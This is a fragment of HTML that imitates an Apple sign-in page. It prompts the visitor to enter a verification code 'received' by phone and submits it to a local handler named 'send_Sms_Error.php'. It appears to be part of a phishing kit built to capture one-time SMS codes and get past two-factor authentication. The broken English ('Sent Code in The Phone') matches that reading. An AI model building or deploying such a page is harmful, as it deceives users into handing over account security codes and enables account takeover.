...
">
            		...
            		<form class="column large-5 small-12 as-signin-returningcustomer" id="cardapp" name="cardapp" action="./system/send_Sms_Error.php" method="post">


            		<fieldset><div class="as-signin-input">

<div class="a-divider a-divider-break"><h5 id="countdown">Sent Code in The Phone </h5>
...
<div class="dddd form-element is-error">
...
<span id="loginHome.customerLogin.appleId-label">Enter the code received :</span></span>
...
<span id="NameOnCardinputError" class="is-error" style="display: none;"></span>
            		...
            		<div class="as-signin-button">
             		 ...
             		 <input style="border-radius: 12px;background: #0071e3" required="" value="Continue" type="submit" class="button button-block form-button" aria-required="true"><br><br><br>
